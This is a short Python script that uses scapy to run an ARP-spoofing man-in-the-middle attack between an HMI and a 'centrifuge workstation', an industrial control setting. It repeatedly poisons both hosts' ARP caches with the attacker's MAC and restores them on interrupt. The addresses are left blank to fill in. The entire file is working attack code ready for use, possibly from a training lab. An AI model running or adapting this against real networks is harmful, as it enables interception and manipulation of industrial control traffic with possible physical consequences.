import scapy.all as scap
import time
import signal

ATTACKER_MAC = "" #change me
REAL_SERVER_IP = '' #centrifuge workstation IP
REAL_SERVER_MAC = '' #centrifuge workstation MAC
HMI_IP = '' #change me


print("starting the spoof. press ctrl+c to end and undo spoof.") 
time.sleep(2)


def reset_spoof():
    print("\nsending packet to undo the spoof.")
    time.sleep(2)
    packet = scap.ARP(op=1, pdst=HMI_IP, hwsrc=REAL_SERVER_MAC, psrc=REAL_SERVER_IP)
    scap.send(packet)
    return

   

def keyboardInterruptHandler(signal, frame):
    reset_spoof()
    exit(0)


signal.signal(signal.SIGINT, keyboardInterruptHandler)



while 1==1:
    print("sending ARP spoof packets")
    time.sleep(2)
    packet = scap.ARP(op=1, pdst=HMI_IP, hwsrc=ATTACKER_MAC, psrc=REAL_SERVER_IP)
    scap.send(packet)
    packet = scap.ARP(op=1, pdst=REAL_SERVER_IP, hwsrc=ATTACKER_MAC, psrc=HMI_IP)
    scap.send(packet)
    time.sleep(10)
